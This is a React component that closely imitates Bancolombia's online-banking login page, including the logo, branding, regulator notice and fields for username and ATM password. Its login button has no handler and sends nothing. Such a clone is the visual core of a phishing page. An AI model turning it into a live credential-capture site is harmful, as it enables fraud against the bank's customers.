import { useState } from "react";
import './App.css';

export default function BancolombiaLogin() {
  const [usuario, setUsuario] = useState("");
  const [clave, setClave] = useState("");

  return (
    <div
      className="min-h-screen flex flex-col relative overflow-hidden"
      style={{ backgroundColor: "#2b2b2b", fontFamily: "'Segoe UI', sans-serif" }}
    >

      {/* ── BACKGROUND: Cintas amarillas de Bancolombia ── */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        {/* Cinta diagonal superior-derecha */}
        <div
          style={{
            position: "absolute",
            top: "-80px",
            right: "-60px",
            width: "520px",
            height: "340px",
            background: "linear-gradient(135deg, #FFD000 0%, #FFA800 100%)",
            borderRadius: "0 0 0 60%",
            opacity: 0.92,
            transform: "rotate(-8deg)",
          }}
        />
        {/* Cinta inferior-izquierda */}
        <div
          style={{
            position: "absolute",
            bottom: "-60px",
            left: "-40px",
            width: "380px",
            height: "220px",
            background: "linear-gradient(135deg, #FFA800 0%, #FFD000 100%)",
            borderRadius: "0 60% 0 0",
            opacity: 0.75,
            transform: "rotate(-5deg)",
          }}
        />
        {/* Acento pequeño superior-izquierda */}
        <div
          style={{
            position: "absolute",
            top: "60px",
            left: "-30px",
            width: "160px",
            height: "100px",
            background: "#FFD000",
            borderRadius: "0 40% 40% 0",
            opacity: 0.35,
            transform: "rotate(10deg)",
          }}
        />
      </div>

      {/* ── HEADER: Logo ── */}
      <header className="relative z-10 flex justify-center pt-8 pb-2">
        <div className="flex items-center gap-3">
          {/* Flecha Bancolombia SVG */}
          <svg width="36" height="28" viewBox="0 0 36 28" fill="none">
            <rect x="0" y="0" width="22" height="8" rx="1" fill="white" />
            <polygon points="22,0 36,14 22,28" fill="white" />
            <rect x="0" y="10" width="22" height="8" rx="1" fill="white" />
            <rect x="0" y="20" width="22" height="8" rx="1" fill="white" />
          </svg>
          <span
            className="text-white"
            style={{ fontSize: "22px", fontWeight: "500", letterSpacing: "0.5px" }}
          >
            Bancolombia
          </span>
        </div>
      </header>

      {/* ── TÍTULO ── */}
      <div className="relative z-10 text-center mt-4 mb-6">
        <h1
          className="text-white"
          style={{ fontSize: "28px", fontWeight: "300", letterSpacing: "0.5px" }}
        >
          Sucursal Virtual Personas
        </h1>
      </div>

      {/* ── CARD CENTRAL ── */}
      <main className="relative z-10 flex justify-center px-4">
        <div
          className="w-full rounded-2xl px-12 py-10"
          style={{
            maxWidth: "500px",
            backgroundColor: "#3a3a3a",
            boxShadow: "0 8px 40px rgba(0,0,0,0.4)",
          }}
        >
          {/* Saludo */}
          <div className="text-center mb-8">
            <p className="text-white font-semibold text-lg">¡Hola!</p>
            <p className="text-gray-300 text-sm mt-1">
              Ingresa los datos para gestionar tus productos y hacer transacciones.
            </p>
          </div>

          {/* Campo Usuario */}
          <div className="mb-1">
            <div
              className="flex items-center gap-3 pb-2"
              style={{ borderBottom: "1px solid rgba(255,255,255,0.35)" }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" strokeWidth="1.8">
                <circle cx="12" cy="8" r="4" />
                <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" />
              </svg>
              <input
                type="text"
                value={usuario}
                onChange={(e) => setUsuario(e.target.value)}
                placeholder="Usuario"
                className="flex-1 bg-transparent text-white text-sm outline-none placeholder-gray-400"
              />
            </div>
          </div>

          {/* Link olvidaste usuario */}
          <div className="mb-6">
            <a href="#" className="text-xs" style={{ color: "#FFD000", textDecoration: "underline" }}>
              ¿Olvidaste tu usuario?
            </a>
          </div>

          {/* Campo Clave */}
          <div className="mb-1">
            <div
              className="flex items-center gap-3 pb-2"
              style={{ borderBottom: "1px solid rgba(255,255,255,0.35)" }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" strokeWidth="1.8">
                <rect x="5" y="11" width="14" height="10" rx="2" />
                <path d="M8 11V7a4 4 0 018 0v4" />
              </svg>
              <input
                type="password"
                value={clave}
                onChange={(e) => setClave(e.target.value)}
                placeholder="Clave del cajero"
                className="flex-1 bg-transparent text-white text-sm outline-none placeholder-gray-400"
              />
            </div>
          </div>

          {/* Link olvidaste clave */}
          <div className="mb-8">
            <a href="#" className="text-xs" style={{ color: "#FFD000", textDecoration: "underline" }}>
              ¿Olvidaste o bloqueaste tu clave?
            </a>
          </div>

          {/* Botón Iniciar sesión */}
          <button
            className="w-full py-3 rounded-full text-white text-sm font-medium transition-all"
            style={{ backgroundColor: "#555555", letterSpacing: "0.3px" }}
            onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = "#666666")}
            onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = "#555555")}
          >
            Iniciar sesión
          </button>

          {/* Crear usuario */}
          <div className="text-center mt-5">
            <a href="#" className="text-white text-sm" style={{ textDecoration: "underline" }}>
              Crear usuario
            </a>
          </div>
        </div>
      </main>

      {/* ── FOOTER ── */}
      <footer className="relative z-10 mt-auto pt-10 pb-4 px-8">
        <div
          className="flex justify-end gap-4 text-xs pb-3 mb-3"
          style={{ color: "rgba(255,255,255,0.55)" }}
        >
          {["¿Problemas para conectarte?", "Aprende sobre seguridad", "Reglamento Sucursal Virtual", "Política de privacidad"].map(
            (link, i) => (
              <span key={link} className="flex items-center gap-4">
                <a href="#" className="hover:text-white transition-colors">{link}</a>
                {i < 3 && <span style={{ color: "rgba(255,255,255,0.3)" }}>·</span>}
              </span>
            )
          )}
        </div>

        <div className="flex items-end justify-between">
          <div className="flex flex-col gap-1">
            <div className="flex items-center gap-2 text-white" style={{ fontSize: "15px", fontWeight: "500" }}>
              <svg width="20" height="16" viewBox="0 0 36 28" fill="none">
                <rect x="0" y="0" width="22" height="5" rx="1" fill="white" />
                <polygon points="22,0 32,9 22,18" fill="white" />
                <rect x="0" y="7" width="22" height="5" rx="1" fill="white" />
                <rect x="0" y="14" width="22" height="5" rx="1" fill="white" />
              </svg>
              Bancolombia
            </div>
            <div style={{ fontSize: "9px", color: "rgba(255,255,255,0.4)", letterSpacing: "0.3px" }}>
              VIGILADO SUPERINTENDENCIA FINANCIERA<br />DE COLOMBIA
            </div>
          </div>

          <div className="text-right" style={{ fontSize: "11px", color: "rgba(255,255,255,0.45)" }}>
            <div>Dirección IP: 190.60.61.139</div>
            <div>domingo, 1 de marzo de 2026, 5:15 p. m.</div>
          </div>
        </div>
      </footer>
    </div>
  );
}